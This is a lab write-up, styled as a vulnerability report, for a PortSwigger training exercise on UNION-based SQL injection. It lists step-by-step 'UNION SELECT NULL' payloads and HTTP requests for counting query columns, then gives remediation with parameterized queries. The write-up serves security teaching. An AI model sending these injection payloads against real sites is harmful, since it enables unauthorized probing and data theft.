
---
# SQL Injection UNION Attack in Product Filter allows Determination of the Number of Query Columns

## 1. Executive Summary

A SQL injection vulnerability exists in the product category filtering functionality, allowing an attacker to inject a `UNION SELECT` statement into the `category` parameter. By progressively adding `NULL` values to the `UNION SELECT` statement, an attacker can determine the number of columns returned by the original SQL query, which is an essential step for further `UNION`-based SQL injection attacks.

## 2. Vulnerability Details

- **Vulnerability Type:** SQL Injection — UNION-based Column Enumeration
    
- **Target Endpoint/URL:** `/filter`
    
- **Affected Parameter(s):** `category`
    
- **Authentication Level Required:** Unauthenticated
    

The application uses the `category` parameter when constructing a backend SQL query.

A `UNION` query requires both `SELECT` statements to return the same number of columns. Therefore, the number of columns in the original query must be determined before successfully executing a `UNION SELECT` attack.

`NULL` values are useful for this purpose because they are compatible with most SQL data types.

## 3. Steps to Reproduce (STR)

1. Access the PortSwigger lab.
    
2. Navigate to the product listing page.
    
3. Select any product category.
    
4. Intercept the request using Burp Suite.
    
5. Locate the `category` parameter.
    
6. Replace its value with:
    

```
'+UNION+SELECT+NULL--
```

7. Forward the request.
    
8. Observe that the application returns an error.
    
9. This indicates that the `UNION SELECT` does not contain the same number of columns as the original query.
    
10. Add another `NULL` value:
    

```
'+UNION+SELECT+NULL,NULL--
```

11. Forward the request again.
    
12. If the application still returns an error, add another `NULL`:
    

```
'+UNION+SELECT+NULL,NULL,NULL--
```

13. Continue increasing the number of `NULL` values:
    

```
'+UNION+SELECT+NULL,NULL,NULL,NULL--
```

14. Continue until the error disappears and the response contains additional content corresponding to the injected `NULL` values.
    
15. The number of `NULL` values in the successful payload represents the number of columns returned by the original query.
    

For example, if:

```
'+UNION+SELECT+NULL--
```

produces an error,

```
'+UNION+SELECT+NULL,NULL--
```

produces an error,

but:

```
'+UNION+SELECT+NULL,NULL,NULL--
```

succeeds, then the original query returns **3 columns**.

## 4. Proof of Concept (PoC)

### HTTP Request/Response

Initial payload:

```
GET /filter?category='+UNION+SELECT+NULL-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

The application returns an error because the original query and injected `SELECT` statement return different numbers of columns.

Second attempt:

```
GET /filter?category='+UNION+SELECT+NULL,NULL-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

If this also fails, continue adding `NULL` values.

For example:

```
GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

If this request succeeds and the response contains additional content, the original query contains **three columns**.

The successful query is conceptually:

```
SELECT ...
UNION SELECT NULL, NULL, NULL--
```

Because both sides of the `UNION` contain three columns, the database can combine their results.

### Evidence (Screenshots/Video)

- Screenshot showing the intercepted `/filter` request.
    
- Screenshot showing the `UNION SELECT NULL--` request producing an error.
    
- Screenshot showing progressively added `NULL` values.
    
- Screenshot showing the successful payload and additional response content.
    
- Screenshot of the completed PortSwigger lab.
    

## 5. Impact Analysis

- **Technical Impact:** The vulnerability allows an attacker to determine the number of columns returned by the underlying SQL query. This information can be used to construct subsequent `UNION SELECT` payloads for extracting database information.
    
- **Business Impact:** Column-count enumeration is primarily an information-gathering step rather than the final impact. However, when combined with a SQL injection vulnerability, it can facilitate further attacks such as database enumeration, sensitive data extraction, and potentially authentication or administrative account compromise.
    

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements so that the `category` parameter is treated strictly as data rather than executable SQL syntax.
    

For example:

```
cursor.execute(
    "SELECT * FROM products WHERE category = %s",
    (category,)
)
```

Additional defenses include:

- Use prepared statements/parameterized queries.
    
- Avoid dynamically constructing SQL queries from user input.
    
- Apply least-privilege permissions to the application's database account.
    
- Avoid exposing detailed SQL errors to users.
    
- Implement appropriate server-side input validation as defense in depth.
    

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection Prevention Cheat Sheet
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - PortSwigger Web Security Academy — SQL Injection UNION Attacks